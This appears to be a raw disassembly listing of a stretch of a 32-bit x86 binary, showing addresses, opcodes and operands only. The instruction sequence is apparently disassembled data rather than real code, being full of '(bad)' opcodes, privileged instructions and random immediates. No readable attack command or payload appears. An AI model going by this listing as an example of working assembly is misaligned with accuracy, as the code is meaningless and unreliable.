  408ace:	mov    cl,0x55
  408ad0:	les    esp,FWORD PTR ds:0x139dfe6b
  408ad6:	inc    DWORD PTR [eax+0x1a995eac]
  408adc:	mov    ebp,0x8214bf69
  408ae1:	pop    esp
  408ae2:	ds gs fwait
  408ae5:	daa    
  408ae6:	mov    ebx,0xa4a2ea50
  408aeb:	fldenv [ecx+ecx*4-0x25]
  408aef:	inc    edi
  408af0:	stc    
  408af1:	xchg   esp,eax
  408af2:	sahf   
  408af3:	push   cs
  408af4:	push   edx
  408af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408af6:	mov    WORD PTR [edi],bp
  408af9:	outs   dx,BYTE PTR ds:[esi]
  408afa:	aad    0x45
  408afc:	retf   0xca44
  408aff:	inc    edx
  408b00:	sbb    eax,0xdcc5f903
  408b05:	mov    WORD PTR [eax-0x74],?
  408b08:	adc    ecx,DWORD PTR [eax+0x13]
  408b0b:	ja     0x408ada
  408b0d:	mov    esp,0x7f685365
  408b12:	adc    al,dh
  408b14:	fs jp  0x408b24
  408b17:	mov    ch,0xef
  408b19:	aaa    
  408b1a:	std    
  408b1b:	push   ebx
  408b1c:	mov    bh,0xfc
  408b1e:	stc    
  408b1f:	loopne 0x408b4c
  408b21:	loop   0x408ab3
  408b23:	inc    ebx
  408b24:	or     cl,bh
  408b26:	aam    0x65
  408b28:	dec    edi
  408b29:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  408b2b:	mov    ch,0x8a
  408b2d:	(bad)  
  408b2e:	dec    ecx
  408b2f:	mov    ch,BYTE PTR [eax+0x3cd92d7c]
  408b35:	add    eax,0xc7e088d2
  408b3a:	lods   al,BYTE PTR ds:[esi]
  408b3b:	mov    DWORD PTR [esi-0x13],esi
  408b3e:	or     BYTE PTR [ebx],al
  408b40:	pop    ds
  408b41:	sub    al,0xc9
  408b43:	aad    0xaa
  408b45:	adc    ebx,esi
  408b47:	(bad)  
  408b48:	mov    ecx,esp
  408b4a:	pusha  
  408b4b:	mov    ebx,0x9ac45ef1
  408b50:	jno    0x408b4d
  408b52:	pushf  
  408b53:	ins    DWORD PTR es:[edi],dx
  408b54:	test   ch,bh
  408b56:	mov    dh,0xf1
  408b58:	std    
  408b59:	cdq    
  408b5a:	push   eax
  408b5b:	or     al,0xd7
  408b5d:	fist   WORD PTR [esp+eiz*2-0x61bf36f9]
  408b64:	xchg   ebx,eax
  408b65:	or     ch,dl
  408b67:	loop   0x408b98
  408b69:	out    0x92,eax
  408b6b:	imul   esi,DWORD PTR [esi+0x21],0x17
  408b6f:	daa    
  408b70:	adc    DWORD PTR [ecx],ebp
  408b72:	inc    esi
  408b73:	sub    eax,0x7d90677a
  408b78:	loopne 0x408bd0
  408b7a:	push   0xffffff91
  408b7c:	bndldx bnd1,[ebp-0x58]
  408b80:	retf   
  408b81:	sub    esi,ebp
  408b83:	aam    0xef
  408b85:	jb     0x408b4f
  408b87:	xor    eax,0x2c4d8a
  408b8c:	mov    ebx,0x44eee081
  408b91:	push   0x6fc296e8
  408b96:	adc    al,0x6a
  408b98:	xor    DWORD PTR [ecx+0x139889e0],edi
  408b9e:	(bad)  
  408b9f:	popa   
  408ba0:	push   cs
  408ba1:	enter  0x6687,0x4
  408ba5:	mov    dl,0x22
  408ba7:	sbb    ch,0x0
  408baa:	cld    
  408bab:	neg    DWORD PTR [ebx+edx*4]
  408bae:	and    al,cl
  408bb0:	or     BYTE PTR [edi],al
  408bb2:	xor    al,BYTE PTR es:[edx]
  408bb5:	adc    DWORD PTR [edi],esp
  408bb7:	sbb    DWORD PTR [edi+0x0],esp
  408bba:	out    0x8b,eax
  408bbc:	add    al,0xc3
  408bbe:	loopne 0x408c36
  408bc0:	popa   
  408bc1:	mov    edx,0x87c63861
  408bc6:	lods   al,BYTE PTR ds:[esi]
  408bc7:	mov    ebp,0xf734a27f
  408bcc:	sbb    cl,BYTE PTR [ebx]
  408bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bcf:	dec    esp
  408bd0:	iret   
  408bd1:	mov    eax,DWORD PTR [ebp+ebx*8-0x475b2431]
  408bd8:	xor    BYTE PTR [ecx+0x141bb72],al
  408bde:	pushf  
  408bdf:	inc    edi
  408be0:	sub    ebp,DWORD PTR [edx]
  408be2:	aaa    
  408be3:	mov    ebx,0x8722efe7
  408be8:	sub    eax,0xc2005b3d
  408bed:	bound  eax,QWORD PTR [ebp+0x2e37544c]
  408bf3:	fnsave [ebx]
  408bf5:	jae    0x408c3d
  408bf7:	daa    
  408bf8:	add    cl,BYTE PTR [ecx-0x40]
  408bfb:	add    eax,0x9d8df44e
  408c00:	inc    ecx
  408c01:	popa   
  408c02:	xchg   esp,eax
  408c03:	call   0x3765:0x4c370f6f
  408c0a:	fwait
  408c0b:	aaa    
  408c0c:	gs test al,0xc3
  408c0f:	cmp    edi,DWORD PTR [esp+ecx*4-0x4058e5d]
  408c16:	push   ebx
  408c17:	lea    ecx,[ecx-0xcbdbb57]
  408c1d:	mov    ds:0x6c9ce67b,al
  408c22:	jb     0x408c01
  408c24:	xchg   esp,eax
  408c25:	mov    WORD PTR [esi+ebp*4],?
  408c28:	out    0x47,al
  408c2a:	test   DWORD PTR ds:[edi+ebp*4],ebx
  408c2e:	cmp    ch,BYTE PTR [ecx]
  408c30:	clc    
  408c31:	push   edi
  408c32:	fdiv   QWORD PTR [edi+0x37fe0566]
  408c38:	js     0x408c8e
  408c3a:	in     al,0xdf
  408c3c:	bound  ebp,QWORD PTR [edx]
  408c3e:	dec    edi
  408c3f:	xchg   edi,eax
  408c40:	jl     0x408bd9
  408c42:	pop    edi
  408c43:	mov    ecx,0xa4970cdc
  408c48:	loope  0x408cb2
  408c4a:	mov    al,ds:0xa658c090
  408c4f:	xor    bh,BYTE PTR [ebx+0x0]
  408c52:	sbb    dh,BYTE PTR [ebp+0x7d]
  408c55:	rcr    DWORD PTR [esi],cl
  408c57:	push   cs
  408c58:	js     0x408be9
  408c5a:	je     0x408c0f
  408c5c:	dec    esi
  408c5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c5e:	pop    esp
  408c5f:	mov    esi,0x446bfc8b
  408c64:	popf   
  408c65:	ror    DWORD PTR es:[ebp-0x2b0b7b08],1
  408c6c:	push   ecx
  408c6d:	inc    esi
  408c6e:	mov    bh,dl
  408c70:	jle    0x408c5b
  408c72:	xor    ch,BYTE PTR [eax-0x20822b53]
  408c78:	sbb    dh,BYTE PTR ds:0x6ac7c1fa
  408c7e:	cld    
  408c7f:	mov    eax,0xc7689952
  408c84:	dec    edi
  408c85:	add    al,0x14
  408c87:	push   ss
  408c88:	inc    ebp
  408c89:	inc    esp
  408c8a:	and    edx,DWORD PTR [ebx+0x5e75dac8]
  408c90:	push   cs
  408c91:	rcr    BYTE PTR ss:[eax],cl
  408c94:	jecxz  0x408c2b
  408c96:	repnz pop ebx
  408c98:	mov    bh,0xa5
  408c9a:	lahf   
  408c9b:	mov    esi,0x262bf123
  408ca0:	fstp   DWORD PTR [edi+0x255230c]
  408ca6:	fdiv   QWORD PTR [ebp-0x41]
  408ca9:	xchg   ebx,eax
  408caa:	push   cs
  408cab:	neg    bh
  408cad:	adc    dh,BYTE PTR [ecx]
  408caf:	or     ecx,ebx
  408cb1:	int    0x78
  408cb3:	shr    BYTE PTR [edi-0x713bcca5],0x64
  408cba:	mov    cl,cl
  408cbc:	jecxz  0x408cf2
  408cbe:	mov    ecx,0xa4d78286
  408cc3:	push   cs
  408cc4:	int    0xd2
  408cc6:	xchg   esi,eax
  408cc7:	rcr    BYTE PTR [edx-0x247e94c0],1
  408ccd:	adc    ch,dh
  408ccf:	mov    eax,ds:0x47f792b4
  408cd4:	or     ebp,DWORD PTR [ebx]
  408cd6:	add    DWORD PTR ds:0xcb089a47,edx
  408cdc:	adc    al,BYTE PTR [ecx+0x10915016]
  408ce2:	call   0x2ac07b28
  408ce7:	inc    edi
  408ce8:	test   eax,esp
  408cea:	mov    edi,0x251fdac9
  408cef:	push   ebx
  408cf0:	adc    BYTE PTR [ecx-0x1174a1da],ah
  408cf6:	xor    al,cl
  408cf8:	sbb    DWORD PTR [esi+ebp*4+0x7c],ebx
  408cfc:	dec    edx
  408cfd:	mov    ds:0xd807e048,al
  408d02:	bound  esp,QWORD PTR [ecx-0x30]
  408d05:	addr16 popf 
  408d07:	push   0x2fb71aff
  408d0c:	nop
  408d0d:	mov    dl,0xb4
  408d0f:	in     al,0x91
  408d11:	mov    cl,0xab
  408d13:	pop    ebp
  408d14:	sub    ah,0x6f
  408d17:	out    dx,al
  408d18:	mov    ecx,DWORD PTR [eax+eax*4-0x66366f0a]
  408d1f:	dec    ecx
  408d20:	xchg   ebp,eax
  408d21:	inc    esi
  408d22:	push   0xa87b5f66
  408d27:	pusha  
  408d28:	pop    ebp
  408d29:	stos   BYTE PTR es:[edi],al
  408d2a:	sbb    ch,BYTE PTR [esi-0x52]
  408d2d:	sbb    BYTE PTR [ebp-0x1],cl
  408d30:	enter  0x4f23,0x62
  408d34:	and    ch,BYTE PTR [ebx-0x5bd01a17]
  408d3a:	ja     0x408da3
  408d3c:	dec    edi
  408d3d:	mov    BYTE PTR [ebp+0x50],al
  408d40:	lds    eax,FWORD PTR [ebp+0x74]
  408d43:	dec    esi
  408d44:	lahf   
  408d45:	inc    ebx
  408d46:	push   eax
  408d47:	mov    ?,WORD PTR [eax+0x45]
  408d4a:	fnsave [ebp+0x75]
  408d4d:	inc    esp
  408d4e:	loopne 0x408d3f
  408d50:	mov    al,ds:0x29be7fd6
  408d55:	add    DWORD PTR [ebp+0xf0536a7],ecx
  408d5b:	xor    al,0x37
  408d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d5e:	sbb    edx,ebx
  408d60:	pusha  
  408d61:	mov    al,dl
  408d63:	shl    DWORD PTR [esi-0x1e888312],1
  408d69:	(bad)  
  408d6a:	repz fcmovbe st,st(6)
  408d6d:	cwde   
  408d6e:	add    BYTE PTR [eax-0x10],dl
  408d71:	pop    eax
  408d72:	and    eax,DWORD PTR [edx-0x6b]
  408d75:	pop    ds
  408d76:	loopne 0x408d2c
  408d78:	int    0x7
  408d7a:	push   ss
  408d7b:	pop    esp
  408d7c:	mov    WORD PTR [ecx-0xf8e8596],ss
  408d82:	xor    edx,ebp
  408d84:	or     DWORD PTR [ecx+0x68],ebp
  408d87:	add    al,0xa4
  408d8a:	cld    
  408d8b:	pop    es
  408d8c:	and    BYTE PTR [edx-0x444a7859],al
  408d92:	and    eax,0xef609c73
  408d97:	xchg   esp,eax
  408d98:	adc    eax,DWORD PTR [eax]
  408d9a:	out    dx,eax
  408d9b:	aaa    
  408d9c:	inc    ebx
  408d9d:	pusha  
  408d9e:	sti    
  408d9f:	(bad)  
  408da0:	(bad)  
  408da2:	nop
  408da3:	or     dl,ch
  408da5:	push   es
  408da6:	xchg   esp,eax
  408da7:	jecxz  0x408e07
  408da9:	dec    ecx
  408daa:	ins    BYTE PTR es:[edi],dx
  408dab:	sbb    DWORD PTR [ebx],ebx
  408dad:	pusha  
  408dae:	shl    BYTE PTR [ecx],0x33
  408db1:	sub    al,ch
  408db3:	sbb    cl,BYTE PTR [esi+0x6ace2131]
  408db9:	push   ecx
  408dba:	ins    BYTE PTR es:[edi],dx
  408dbb:	repnz xchg ebp,eax
  408dbd:	or     dh,BYTE PTR [eax+esi*1]
  408dc0:	les    edx,FWORD PTR [ecx-0x9058cb9]
  408dc6:	jnp    0x408db8
  408dc8:	cmp    al,0x15
  408dca:	lods   al,BYTE PTR ds:[esi]
  408dcb:	mov    WORD PTR [eax],gs
  408dcd:	sti    
  408dce:	and    BYTE PTR [ebp+0x1c3802f5],0xcc
  408dd5:	xor    eax,0xb3ee269f
  408dda:	or     DWORD PTR [ebx+eiz*4-0x6a],0x32
  408ddf:	cwde   
  408de0:	and    DWORD PTR [ebx+0x6d],ecx
  408de3:	jle    0x408de9
  408de5:	iret   
  408de6:	jnp    0x408d8e
  408de8:	jnp    0x408d79
  408dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408deb:	pop    ss
  408dec:	out    0xc2,al
  408dee:	pushf  
  408def:	pop    esp
  408df0:	pop    ss
  408df1:	xor    BYTE PTR ss:[edx],ah
  408df4:	jmp    0xd56283f3
  408df9:	inc    eax
  408dfa:	outs   dx,DWORD PTR ds:[esi]
  408dfb:	sahf   
  408dfc:	xchg   esi,eax
  408dfd:	in     al,dx
  408dfe:	int3   
  408dff:	(bad)
  408e02:	and    al,0x8b
  408e04:	data16 fwait
  408e06:	ins    DWORD PTR es:[edi],dx
  408e07:	lahf   
  408e08:	cmp    edi,DWORD PTR [edi+esi*4-0x6554324]
  408e0f:	addr16 retf 0x9296
  408e13:	fild   QWORD PTR [ecx+0x760e6b68]
  408e19:	enter  0x19bf,0xb4
  408e1d:	ss pop ss
  408e1f:	or     BYTE PTR [ecx],cl
  408e21:	jge    0x408e07
  408e23:	xchg   edx,eax
  408e24:	in     al,0x18
  408e26:	jno    0x408e5a
  408e28:	(bad)  
  408e29:	and    ebp,eax
  408e2b:	push   esp
  408e2c:	(bad)  
  408e2d:	jmp    0x95c3:0xff5cd1d2
  408e34:	push   ss
  408e35:	leave  
  408e36:	(bad)  
  408e37:	mov    bl,0x6f
  408e39:	std    
  408e3a:	add    eax,0x63e1cb5b
  408e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e40:	pop    ebp
  408e41:	mov    eax,ds:0x1dedcab3
  408e46:	jg     0x408e6f
  408e48:	rcr    BYTE PTR [esi-0x68],1
  408e4b:	sti    
  408e4c:	adc    al,0x6
  408e4e:	(bad)  
  408e4f:	adc    al,ah
  408e51:	jecxz  0x408e41
  408e53:	fwait
  408e54:	mov    BYTE PTR [edi+eax*2+0x2af7e9a2],ch
  408e5b:	call   0x773deed6
  408e60:	int    0x7
  408e62:	add    eax,0x431188d2
  408e67:	adc    edi,ebx
  408e69:	repnz retf 
  408e6b:	daa    
  408e6c:	inc    ebx
  408e6d:	outs   dx,DWORD PTR ds:[esi]
  408e6e:	std    
  408e6f:	mov    eax,ds:0xe174e185
  408e74:	test   eax,0x28dc4c70
  408e79:	popf   
  408e7a:	test   BYTE PTR [edi+0xcb0e11c],dh
  408e80:	call   0x1dc5263a
  408e85:	xor    BYTE PTR [edx-0x7b],ch
  408e88:	mov    al,BYTE PTR [ecx+0x67]
  408e8b:	pop    edi
  408e8c:	iret   
  408e8d:	or     al,0xf9
  408e8f:	and    DWORD PTR [eax+0x2ed2274d],0x895b8425
  408e99:	stos   BYTE PTR es:[edi],al
  408e9a:	shl    DWORD PTR [ebx+0x5f6d9fdb],1
  408ea0:	jae    0x408e52
  408ea2:	dec    ebx
  408ea3:	jbe    0x408ef3
  408ea5:	or     DWORD PTR [ecx-0x2d],0x2b
  408ea9:	retf   0xe0df
  408eac:	pop    ss
  408ead:	sub    ebx,DWORD PTR [esi]
  408eaf:	fistp  QWORD PTR ss:[ecx]
  408eb2:	push   edx
  408eb3:	stos   BYTE PTR es:[edi],al
  408eb4:	xchg   DWORD PTR [ebp+0x274d3936],eax
  408eba:	js     0x408e6f
  408ebc:	fdiv   DWORD PTR [ebx-0xe4ad512]
  408ec2:	and    ebx,ebp
  408ec4:	jo     0x408e7e
  408ec6:	or     dh,cl
  408ec8:	fstp   DWORD PTR [ecx-0x49]
  408ecb:	xchg   edx,eax
  408ecc:	cmp    BYTE PTR [ecx],ch
  408ece:	sub    ch,BYTE PTR [ecx+0x73e1e885]
  408ed4:	or     edi,ecx
  408ed6:	inc    eax
  408ed7:	out    dx,al
  408ed8:	pusha  
  408ed9:	mov    bh,0x5a
  408edb:	je     0x408ebc
  408edd:	adc    eax,0x40c0ddfd
  408ee2:	add    edx,0x17
  408ee5:	sub    ebx,DWORD PTR ds:0x1920ccbb
  408eeb:	cmp    al,0xe8
  408eed:	pop    ds
  408eee:	sbb    eax,0x9b3cee79
  408ef3:	adc    al,0x6d
  408ef5:	loopne 0x408f2f
  408ef7:	fcmovb st,st(6)
  408ef9:	pop    esi
  408efa:	out    0x5a,al
  408efc:	inc    ecx
  408efd:	rcl    esi,1
  408eff:	mov    al,ds:0x8a9259ca
  408f04:	jno    0x408f25
  408f06:	and    DWORD PTR [esi+0x7e],esp
  408f09:	inc    ecx
  408f0a:	pop    edi
  408f0b:	neg    esi
  408f0d:	inc    esp
  408f0e:	hlt    
  408f0f:	in     eax,0xfc
  408f11:	jno    0x408f6f
  408f13:	push   ecx
  408f14:	out    dx,al
  408f15:	sub    ebp,0xe9a978fe
  408f1b:	xor    edi,DWORD PTR [ebx]
  408f1d:	fstp   TBYTE PTR [ebx]
  408f1f:	test   BYTE PTR [ebx+0x7],cl
  408f22:	add    bh,cl
  408f24:	jno    0x408f06
  408f26:	arpl   WORD PTR [esp+eiz*8+0x3f],dx
  408f2a:	mov    WORD PTR [esi],ds
  408f2c:	retf   
  408f2d:	call   0xc722:0x87a5518e
  408f34:	cli    
  408f35:	loop   0x408f33
  408f37:	and    DWORD PTR [ecx],edi
  408f39:	mov    eax,0xdead7f18
  408f3e:	pop    ecx
  408f3f:	stos   BYTE PTR es:[edi],al
  408f40:	ins    BYTE PTR es:[edi],dx
  408f41:	mov    ebx,0x3cd3a318
  408f46:	mov    al,ds:0x9bdeb677
  408f4b:	jnp    0x408f3f
  408f4d:	sbb    al,0x56
  408f4f:	mov    ds,WORD PTR ds:[edx]
  408f52:	rcr    DWORD PTR [esi+0x25],cl
  408f55:	adc    BYTE PTR [ecx-0x7a],0xc1
  408f59:	div    BYTE PTR [edx-0x59]
  408f5c:	sar    ebp,1
  408f5e:	mov    bh,0xc7
  408f60:	ins    DWORD PTR es:[edi],dx
  408f61:	test   DWORD PTR [ebp-0x66fd4393],esp
  408f67:	retf   
  408f68:	mov    bh,0x42
  408f6a:	scas   eax,DWORD PTR es:[edi]
  408f6b:	pop    ebp
  408f6c:	repnz mov BYTE PTR [esi],dl
  408f6f:	push   ss
  408f70:	cdq    
  408f71:	jne    0x408f58
  408f73:	out    dx,al
  408f74:	xchg   ebx,eax
  408f75:	sub    dh,cl
  408f77:	aam    0x78
  408f79:	push   esi
  408f7a:	out    dx,eax
  408f7b:	pop    ecx
  408f7c:	adc    cl,dh
  408f7e:	mov    cl,BYTE PTR ds:[ecx-0x4d]
  408f82:	add    dl,BYTE PTR ds:[ecx]
  408f85:	aam    0xd1
  408f87:	xor    DWORD PTR [eax],ebp
  408f89:	not    BYTE PTR [edx-0x2f]
  408f8c:	push   esp
  408f8d:	dec    ebp
  408f8e:	imul   edx,edi,0xb839caf5
  408f94:	dec    esi
  408f95:	mov    al,0x5e
  408f97:	out    0xe3,eax
  408f99:	iret   
  408f9a:	dec    eax
  408f9b:	pop    esp
  408f9c:	jne    0x408f7e
  408f9e:	(bad)  
  408f9f:	(bad)  
  408fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fa1:	sub    esi,esi
  408fa3:	lods   eax,DWORD PTR ds:[esi]
  408fa4:	icebp  
  408fa5:	mov    cl,0xc0
  408fa7:	retf   
  408fa8:	gs in  al,0x5a
  408fab:	mov    eax,ds:0x597a81ba
  408fb0:	fld    DWORD PTR [edx+0x3dc22658]
  408fb6:	mov    cr5,ecx
  408fb9:	gs (bad) 
  408fbb:	int    0x30
  408fbd:	pop    edx
  408fbe:	shr    ax,cl
  408fc1:	mov    ecx,0x7b0ad2d0
  408fc6:	je     0x408fb3
  408fc8:	ret    0x8f04
  408fcb:	ror    bl,1
  408fcd:	loopne 0x408f83
  408fcf:	push   ebp
  408fd0:	es ja  0x408f6f
  408fd3:	(bad)  
  408fd4:	fstp   QWORD PTR [ebx-0x775250fb]
  408fda:	retf   0x7db0
  408fdd:	hlt    
  408fde:	pop    ebp
  408fdf:	push   ss
  408fe0:	loop   0x408fad
  408fe2:	jo     0x408f78
  408fe4:	test   DWORD PTR [esi],esi
  408fe6:	test   eax,0xe20058ba
  408feb:	sti    
  408fec:	stc    
  408fed:	sbb    esi,DWORD PTR [eax-0x43]
  408ff0:	xchg   esp,eax
  408ff1:	push   edi
  408ff2:	adc    al,al
  408ff4:	fist   DWORD PTR [ecx]
  408ff6:	pop    esi
  408ff7:	xor    DWORD PTR [edx-0x52],edi
  408ffa:	fisub  DWORD PTR [edi]
  408ffc:	cmp    al,0x7e
  408ffe:	(bad)  
  408fff:	sub    eax,0x115d0028
  409004:	jbe    0x409035
  409006:	xchg   edx,eax
  409007:	jg     0x40900e
  409009:	jmp    0x408fc0
  40900b:	test   eax,0x95fecb2b
  409010:	lds    ebp,FWORD PTR [ebp-0x4c71ec29]
  409016:	mov    ds:0x336fbef3,al
  40901b:	das    
  40901c:	addr16 icebp 
  40901e:	aad    0x1e
  409020:	pop    esi
  409021:	gs jp  0x408fbd
  409024:	int    0x25
  409026:	(bad)  
  409027:	push   ebp
  409028:	mov    al,0xcc
  40902a:	shr    esp,0x73
  40902d:	leave  
  40902e:	mov    bh,BYTE PTR [edx]
  409030:	sbb    al,0x7c
  409032:	popa   
  409033:	and    ch,BYTE PTR [esi-0x379f0056]
  409039:	mov    ebx,0x170f4210
  40903e:	sub    al,0x20
  409040:	add    ecx,DWORD PTR [edi]
  409042:	jmp    0x40903f
  409044:	ret    
  409045:	dec    edi
  409046:	dec    edi
  409047:	mov    DWORD PTR [eax],eax
  409049:	gs dec esp
  40904b:	xor    DWORD PTR [ebp-0x24],0xffffffa5
  40904f:	jl     0x40900b
  409051:	xchg   esp,eax
  409052:	out    dx,al
  409053:	inc    ebp
  409054:	aad    0xa7
  409056:	test   esp,ecx
  409058:	jnp    0x40907e
  40905a:	(bad)  
  40905b:	mul    eax
  40905d:	stos   BYTE PTR es:[edi],al
  40905e:	add    BYTE PTR [esi+0x693d40bf],dl
  409064:	repnz sub eax,0x57abf697
  40906a:	dec    edi
  40906b:	(bad)  
  40906c:	scas   al,BYTE PTR es:[edi]
  40906d:	mov    esp,edx
  40906f:	mov    dh,0x84
  409071:	ret    
  409072:	(bad)  
  409073:	(bad)  
  409074:	mov    eax,0x189d226
  409079:	pop    ds
  40907a:	sar    al,0xf4
  40907d:	jnp    0x4090bc
  40907f:	adc    eax,0x34bd5a36
  409084:	xchg   ecx,eax
  409085:	imul   ecx,DWORD PTR [edi+eax*8],0xb30417c3
  40908c:	jmp    FWORD PTR [eax+0x66e382a3]
  409092:	repz pop ss
  409094:	daa    
  409095:	adc    ebp,DWORD PTR [ebx-0x52b975d3]
  40909b:	mov    DWORD PTR [ecx-0x28],edx
  40909e:	lea    ebx,cs:[ecx+0xf5b09ad]
  4090a5:	(bad)  
  4090a6:	jns    0x409101
  4090a8:	mov    edi,0x31be1f9e
  4090ad:	(bad)  
  4090ae:	cmp    al,0x2
  4090b0:	icebp  
  4090b1:	adc    esp,eax
  4090b3:	xor    eax,DWORD PTR ds:0xad1e5e8e
  4090b9:	dec    eax
  4090ba:	shl    BYTE PTR [edi],cl
  4090bc:	and    ch,ch
  4090be:	(bad)  
  4090bf:	dec    esp
  4090c0:	push   edi
  4090c1:	dec    ecx
  4090c2:	es pop edi
  4090c4:	adc    esp,DWORD PTR [esp+edi*8]
  4090c7:	fidivr WORD PTR [ecx-0x2a]
  4090ca:	ins    BYTE PTR es:[edi],dx
  4090cb:	jnp    0x40913b
  4090cd:	pop    edi
  4090ce:	push   esp
  4090cf:	shl    dh,cl
  4090d1:	mov    gs,WORD PTR [esi+0x69]
  4090d4:	adc    BYTE PTR cs:[esi],0x45
  4090d8:	jl     0x4090c1
  4090da:	into   
  4090db:	sbb    BYTE PTR [eax+ebp*2],bl
  4090de:	loop   0x40908e
  4090e0:	push   edi
  4090e1:	cmc    
  4090e2:	inc    eax
  4090e3:	(bad)  
  4090e4:	lods   al,BYTE PTR ds:[esi]
  4090e5:	dec    eax
  4090e6:	jecxz  0x4090fe
  4090e8:	jle    0x409108
  4090ea:	dec    esp
  4090eb:	out    dx,eax
  4090ec:	test   al,0x84
  4090ee:	bound  edi,QWORD PTR [ebx-0x28]
  4090f1:	push   edi
  4090f2:	cli    
  4090f3:	push   cs
  4090f4:	repz xchg esp,ecx
  4090f7:	bnd jne 0x4090c0
  4090fa:	and    DWORD PTR [edi+eax*2+0x755df2bd],ecx
  409101:	cmp    DWORD PTR [ebp-0x50],eax
  409104:	sub    eax,0x8ccdaa4a
  409109:	mov    edx,0x153073c9
  40910e:	inc    ecx
  40910f:	clc    
  409110:	sti    
  409111:	mov    ds:0x32833add,eax
  409116:	lds    edi,FWORD PTR [ecx+edi*1]
  409119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40911a:	dec    eax
  40911b:	and    BYTE PTR [ecx],0xd5
  40911e:	(bad)  
  40911f:	push   0x74
  409121:	add    al,0x8a
  409123:	std    
  409124:	(bad)  
  409125:	push   ds
  409126:	fistp  WORD PTR [edi]
  409128:	mov    dh,0x1e
  40912a:	mov    cl,0x9e
  40912c:	mov    bh,0x5f
  40912e:	xor    eax,0xc4c2a9bc
  409133:	lods   eax,DWORD PTR es:[esi]
  409135:	sub    eax,0xf13cdf9b
  40913a:	cs cwde 
  40913c:	add    edx,ebp
  40913e:	pop    ss
  40913f:	ja     0x4090fb
  409141:	in     al,0x5a
  409143:	daa    
  409144:	add    esp,esi
  409146:	xor    cl,BYTE PTR ds:[edi+0x5ac9a16e]
  40914d:	push   ebx
  40914e:	sbb    BYTE PTR [eax+edx*8+0x72],ch
  409152:	push   edi
  409153:	jmp    0xbe46acde
  409158:	test   dl,dl
  40915a:	or     BYTE PTR [ebx],dh
  40915c:	rol    DWORD PTR [edx-0x5d0e7ddc],cl
  409162:	push   cs
  409163:	sub    DWORD PTR [ebx+esi*1+0x33],edi
  409167:	mov    ?,WORD PTR [esi+edx*2]
  40916a:	and    al,0x77
  40916c:	or     ecx,DWORD PTR [edi]
  40916e:	dec    edi
  40916f:	cli    
  409170:	cmp    edi,DWORD PTR [esi-0xfe34e54]
  409176:	push   edx
  409177:	adc    edi,DWORD PTR [edi]
  409179:	scas   al,BYTE PTR es:[edi]
  40917a:	mov    bh,0x74
  40917c:	push   ss
  40917d:	ret    
  40917e:	loop   0x409171
  409180:	in     eax,0xac
  409182:	and    BYTE PTR [ebp-0x7e546e8c],0xf9
  409189:	ja     0x4091be
  40918b:	cdq    
  40918c:	sar    DWORD PTR [eax-0x64],1
  40918f:	in     eax,dx
  409190:	ss ins DWORD PTR es:[edi],dx
  409192:	clc    
  409193:	push   ss
  409194:	mov    ss,WORD PTR [ecx+ebp*4+0x3a]
  409198:	in     eax,dx
  409199:	pop    ebp
  40919a:	outs   dx,BYTE PTR ds:[esi]
  40919b:	fst    QWORD PTR [ecx]
  40919d:	inc    ecx
  40919e:	jb     0x409196
  4091a0:	iret   
  4091a1:	and    DWORD PTR [ebp-0x77],0x386a9fed
  4091a8:	xlat   BYTE PTR ds:[ebx]
  4091a9:	scas   eax,DWORD PTR es:[edi]
  4091aa:	mov    esp,0x7c5b013e
  4091af:	popf   
  4091b0:	imul   edi
  4091b2:	mov    ds:0xec3a3122,eax
  4091b7:	mov    esi,0xebecc31f
  4091bc:	ret    
  4091bd:	cmp    dh,BYTE PTR es:[eax+esi*2+0x7a]
  4091c2:	out    dx,al
  4091c3:	cdq    
  4091c4:	mov    dl,BYTE PTR [ebp-0x67de2be4]
  4091ca:	retf   0x9b0b
  4091cd:	rcl    DWORD PTR [esi],cl
  4091cf:	in     eax,dx
  4091d0:	inc    edi
  4091d1:	out    0x7b,eax
  4091d3:	xchg   ecx,eax
  4091d4:	dec    esi
  4091d5:	push   cs
  4091d6:	inc    ecx
  4091d7:	pop    edx
  4091d8:	ror    DWORD PTR [ebp+0x334404ec],cl
  4091de:	or     BYTE PTR [ecx+edi*4-0x7bcd6c01],al
  4091e5:	mov    cl,0x85
  4091e7:	adc    BYTE PTR [edx+0x4c2787b0],0xaa
  4091ee:	mov    al,0x68
  4091f0:	pop    ds
  4091f1:	ins    DWORD PTR es:[edi],dx
  4091f2:	fwait
  4091f3:	cmp    eax,0x99be17a
  4091f8:	call   0xd363:0xd963cf95
  4091ff:	xlat   BYTE PTR ds:[ebx]
  409200:	and    bh,BYTE PTR [esi-0x4eae1dec]
  409206:	push   es
  409207:	imul   esp,DWORD PTR [ebp-0x245d4811],0xd317e9e0
  409211:	add    eax,0x4f28748c
  409216:	fdivr  QWORD PTR [edx]
  409218:	daa    
  409219:	inc    eax
  40921a:	inc    ebx
  40921b:	popf   
  40921c:	jnp    0x409215
  40921e:	add    eax,0x25f3db79
  409223:	dec    esp
  409224:	out    dx,eax
  409225:	(bad)  
  409226:	stc    
  409227:	les    edi,FWORD PTR [esi-0x7bdfa0d3]
  40922d:	jno    0x4091f8
  40922f:	lods   al,BYTE PTR ds:[esi]
  409230:	pop    ebx
  409231:	jns    0x4092a3
  409233:	sbb    ebx,ecx
  409235:	add    DWORD PTR [ebp+0x35c7261c],ebp
  40923b:	adc    cl,BYTE PTR [edx-0x154baa9f]
  409241:	out    0x8f,al
  409243:	std    
  409244:	and    eax,0xc1cb146d
  409249:	fwait
  40924a:	hlt    
  40924b:	div    DWORD PTR [ebx+0x45]
  40924e:	cmp    al,BYTE PTR [esi]
  409250:	dec    eax
  409251:	(bad)  
  409252:	shl    DWORD PTR [edi-0x68],1
  409255:	mov    dl,0x2d
  409257:	xchg   ebp,eax
  409258:	push   edx
  409259:	mov    ebx,0x7aa748ab
  40925e:	outs   dx,BYTE PTR ds:[esi]
  40925f:	leave  
  409260:	mov    eax,ds:0x43f4da24
  409265:	aaa    
  409266:	adc    ebp,DWORD PTR [ebx]
  409268:	inc    edi
  409269:	inc    edi
